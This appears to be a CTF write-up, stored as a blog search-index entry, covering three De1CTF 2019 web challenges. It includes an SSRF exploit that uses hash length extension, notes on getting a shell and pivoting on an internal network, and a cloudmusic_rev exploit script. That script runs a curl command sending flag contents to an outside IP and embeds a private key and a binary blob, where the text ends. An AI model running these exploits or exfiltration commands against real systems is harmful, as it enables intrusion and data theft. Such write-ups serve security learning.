<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[De1CTF 2019 WEB WP]]></title>
    <url>%2F2019%2F08%2F11%2FDe1CTF-2019-wp%2F</url>
    <content type="text"><![CDATA[0x00 前言在家宅着不想写wp，来学第一天补上 0x01 SSRF Me题目描述SSRF ME TO GET FLAG. http://139.180.128.86/ 题目解答123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110#! /usr/bin/env python#encoding=utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding('latin1')app = Flask(__name__)secert_key = os.urandom(16)class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = &#123;&#125; result['code'] = 500 if (self.checkSign()): if "scan" in self.action: tmpfile = open("./%s/result.txt" % self.sandbox, 'w') resp = scan(self.param) if (resp == "Connection Timeout"): result['data'] = resp else: print resp tmpfile.write(resp) tmpfile.close() result['code'] = 200 if "read" in self.action: f = open("./%s/result.txt" % self.sandbox, 'r') result['code'] = 200 result['data'] = f.read() if result['code'] == 500: result['data'] = "Action Error" else: result['code'] = 500 result['msg'] = "Sign Error" return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False#generate Sign For Action Scan.@app.route("/geneSign", methods=['GET', 'POST'])def geneSign(): param = urllib.unquote(request.args.get("param", "")) action = "scan" return getSign(action, param)@app.route('/De1ta',methods=['GET','POST'])def challenge(): action = urllib.unquote(request.cookies.get("action")) param = urllib.unquote(request.args.get("param", "")) sign = urllib.unquote(request.cookies.get("sign")) ip = request.remote_addr if(waf(param)): return "No Hacker!!!!" task = Task(action, param, sign, ip) return json.dumps(task.Exec())@app.route('/')def index(): return open("code.txt","r").read()def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return "Connection Timeout"def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest()def md5(content): return hashlib.md5(content).hexdigest()def waf(param): check=param.strip().lower() if check.startswith("gopher") or check.startswith("file"): return True else: return Falseif __name__ == '__main__': app.debug = False app.run(host='0.0.0.0',port=80) 默认sign的时候试讲action设置为scan来讲文件读进result.txt文件 需要设置sign中的action为read（hash扩展攻击） 利用https://bugs.python.org/issue35907来进行ssrf读文件 EXP:123456789101112131415# -*- coding: utf-8 -*-import requestsimport hashpumpyimport urllib.parse as upreadfile = 'local_file:///proc/self/cwd/flag.txt'url1 = 'http://139.180.128.86/geneSign?param=' + readfilereq = requests.get(url = url1)sign = req.contenthash_sign = hashpumpy.hashpump(sign, readfile + 'scan', 'read', 16)sign_next = hash_sign[0]action_next = up.quote(hash_sign[1][len(readfile):])url2 = 'http://139.180.128.86/De1ta?param='+readfileresult = requests.get(url = url2, cookies=&#123;'sign': sign_next, 'action': action_next&#125;)print(result.content) 官方解法：https://github.com/De1ta-team/De1CTF2019/blob/8f981109d95af76456d1e59deab058f8a7bba3b0/writeup/web/SSRF%20Me/README_zh.md 0x02 ShellShellShell题目描述hint : The flag file ,with “flag” keyword ,is in the inside computer.(flag文件在内网的机子上，并且flag文件的文件名带有flag关键字) shell me plz 题目解答因为对easy-php这题印象深刻，所以看到题目之后立马就联想到了，所以老套路走一波。参考下面这个wp很容易就能getshell https://github.com/rkmylo/ctf-write-ups/tree/master/2018-n1ctf/web/easy-php-540 进到内网之后先查看/etc/hosts文件1234567127.0.0.1 localhost::1 localhost ip6-localhost ip6-loopbackfe00::0 ip6-localnetff00::0 ip6-mcastprefixff02::1 ip6-allnodesff02::2 ip6-allrouters172.18.0.3 df459fa2cbad 发现对应的内网地址，之后使用fcn代理出来，在172.18.0.2上的80端口发现一个代码审计题，题目出自pwnhub，所以参考wp直接传webshell之后包含getshell https://cloud.tencent.com/developer/article/1360551 之后1find / -name &quot;*flag*&quot; 即可得到flag PS: 我觉得这题的dockerfile值得一看 0x03 cloudmusic_rev题目描述滑稽云音乐平台 2.0 上线了。 Comical CloudMusis 2.0 is online. 题目解答首先想到国赛决赛中出现的1.0版本https://github.com/impakho/ciscn2019_final_web1 然后按照这个套路做题： 首先是注册账号处理验证码，这里要求验证码是6位，所以成功注册一个账号adfasd1/123456aaaa 右键查看源代码发现任意文件下载 但是不能直接下载php后缀的文件需要bypass bypass:(1) 将php://filter/read=convert.base64-encode/resource=../include/firmware.php urlencode最好用bp来完全编码(2) base64下载源码 因为代码里面此处的不同$firmware_filename=md5(mt_rand().$_SERVER[&#39;REMOTE_ADDR&#39;]);所以exp里面要改成IP 上传溢出admin密码的长度变了，之前是0x300，现在是0x70 修改之前的exp后盲打得到flag {‘username’: ‘admin’, ‘password’: ‘Mike84eiNxHcMVCz’} 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368#!/usr/bin/python2#coding:utf-8from sys import *from base64 import *from Crypto.PublicKey import RSAimport requestsimport stringimport timeimport hashlibimport randomimport jsonfrom datetime import datetimetimeout = 1.0retry_count = 5logging = 1site_url = ''s = requests.session()time_zone_offset = 60 * 60 * 8# command = "/usr/bin/tac /fl*g*"command = "curl http://47.90.204.28/`/usr/bin/tac /fl*g*`"# command = "ls"preset_key = b64decode('LS0tLS1CRUdJTiBQUklWQVRFIEtFWS0tLS0tCk1JSUNkd0lCQURBTkJna3Foa2lHOXcwQkFRRUZBQVNDQW1Fd2dnSmRBZ0VBQW9HQkFPTWp4eXVIcWRuSmFyUDAKSHl1eFVVRHkvY1BGaWMzYjM5WUQrVzY5R2VSRkpMRDUraFhaM3lYMTFBQ2pMSHpESFpIbGgrajRQZncxdEhMMApwY3FPZmJ0TTF4am5sV2FKd3lZQzRpWlBSRXJUTGNVd282UmhKS2diUkxHQVpLUmxmWFFMbVRwbGd0ZnJoUGhJCng0ZzM2ZEtLTVVlYjZnOHJ3blVrUnVYSVlhd2hBZ01CQUFFQ2dZRUEwUWZrQzFOV0pHOFFHM3ZXRThlakZ6cUgKL3RxVDd6Y2h6enJwR2RnOU02M09EbkIramcxckp1d01wbW1FVDJ6Z2tadkNiOHZFZjQ2TStoM2JWWVc4Zmg1Zwp4dTlXdmJFb0orUGZtV2R6SmowUlRYT05vZXVzRUgwODI3eGl6UXlIc21RbkNBQzkyUS9IQlg4WVl0eDgxN0pOCnNIUmNFMHdacVFmL0dkU0VnK0VDUVFEMGVjUlJYN3BsT0hTOHNjTjFqT3FOMEl5S2pvamljWWNQL2h3ckU2ZjIKZGR3dEpnNlJBb3E3SHlRdUFjYmZCazJwdS9UeDRsSHRycm9qRXlxQTRLdjdBa0VBN2RqUEFCakEvaHlpV1oxTQpDUm5DTTRudWdDUEE1SXRxZktzb3UvbE51cUdYZXFVYW5XNjBTcmJDVWJrM2g2NnkwdXV2T0xzendEWllONnNNClFEWFJrd0pBUlB3N1BtOFJ6TkF5ZUxCOHBDWUFaY1lNY21pb0RhWFZZOWpqbi9BcS9Ddmoxa1dmNUtGZi9rOWEKU1RVdEplL0VhSG5tTTM4V2VVaE5zK29MbTFSS2t3SkFNcCtyNTJ4ZFgzaSt3VzR1YWQxMnJUdVZiT2F2UHJYQgowNGttb1dPOXZKUjZSbHR2MzhSWlVYRzJ5R2d3dm90YmVuTTVsMHlaQmpkSzdZWlZsREVnU3dKQkFMb29yYmZnCkJzMW5BbGU3WnhXK0JkRXlLVG9ZUWdWVU1MRytWeDFITW9rU0dZNlh6blNFYzdpK25weFBoeGd6Q1VWdHpxNU4KR3E4Q3ppN2FJUFVuY0lnPQotLS0tLUVORCBQUklWQVRFIEtFWS0tLS0tCg==')preset_music = b64decode('SUQzBAAAAAABBFRSQ0sAAAADAAADMQBUSVQyAAAAEgAAA2JiYmJiYmJiYmJiYmJiYmIAVEFMQgAAABIAAANjY2NjY2NjY2NjY2NjY2NjAFRQRTEAAAASAAADYWFhYWFhYWFhYWFhYWFhYQA=')preset_firmare = b64decode('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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEiD7AhIiwXVLwAASIXAdAL/0EiDxAjDAAAAAAAAAAAA/zXiLwAA/yXkLwAADx9AAP8l4i8AAGgAAAAA6eD/////JdovAABoAQAAAOnQ/////yXSLwAAaAIAAADpwP////8lyi8AAGgDAAAA6bD/////JYIvAABmkAAAAAAAAAAASI09wS8AAEiNBbovAABIOfh0FUiLBT4vAABIhcB0Cf/gDx+AAAAAAMMPH4AAAAAASI09kS8AAEiNNYovAABIKf5Iwf4DSInwSMHoP0gBxkjR/nQUSIsFFS8AAEiFwHQI/+BmDx9EAADDDx+AAAAAAIA9aS8AAAB1L1VIgz32LgAAAEiJ5XQMSIs9Ki8AAOhd////6Gj////GBUEvAAABXcMPH4AAAAAAww8fgAAAAADpe////1VIieVIg+wQSIsFpC4AAEiLALowAQAAvgAAAABIicfo9/7//0iNNaAOAABIjT2hDgAA6PT+//9IiUX4SIN9+AB0MUiLBWouAABIiwBIi1X4SInRugABAAC+AQAAAEiJx+iW/v//SItF+EiJx+ia/v//6wGQycMASIPsCEiDxAjDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA